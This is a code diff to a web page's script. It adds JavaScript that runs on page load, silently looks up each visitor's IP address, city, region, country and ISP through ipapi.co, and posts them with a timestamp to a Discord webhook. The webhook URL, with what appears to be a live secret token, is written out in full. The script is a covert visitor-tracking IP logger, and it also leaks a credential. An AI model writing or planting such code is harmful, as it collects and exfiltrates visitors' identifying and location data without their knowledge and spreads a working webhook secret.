@@ -21,16 +21,49 @@
     </div>
 </div>
 <script>
-      fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-          const msg = `New visitor from ${data.city}, ${data.country_name} (${data.ip})`;
-          fetch('https://your-vercel-project.vercel.app/api/log', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: msg })
-          });
-        });
-    </script>
+    // Fetch IP data from ipapi.co
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(ipData => {
+        console.log("IP Data:", ipData);
+
+        // Prepare the payload for the webhook
+        const payload = {
+          content: "New visitor info:",
+          embeds: [
+            {
+              title: "Visitor IP Info",
+              color: 3447003,
+              fields: [
+                { name: "IP", value: ipData.ip, inline: true },
+                { name: "City", value: ipData.city, inline: true },
+                { name: "Region", value: ipData.region, inline: true },
+                { name: "Country", value: ipData.country_name, inline: true },
+                { name: "Org", value: ipData.org, inline: false },
+                { name: "Time", value: new Date().toISOString(), inline: false }
+              ]
+            }
+          ]
+        };
+
+        // Send to webhook (e.g., Discord, your own)
+        fetch('https://discord.com/api/webhooks/1362292402018320457/a_Gu5SAppbz-aY3HxtB-6bfSKn5S1FmkQt3plpK-QdRBRYE5gPNqnEelgHn17tvhElOQ', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log("Webhook sent successfully.");
+          } else {
+            console.error("Webhook failed:", response.statusText);
+          }
+        })
+        .catch(err => console.error("Fetch error:", err));
+      })
+      .catch(err => console.error("IP fetch error:", err));
+  </script>
 </body>
 </html>
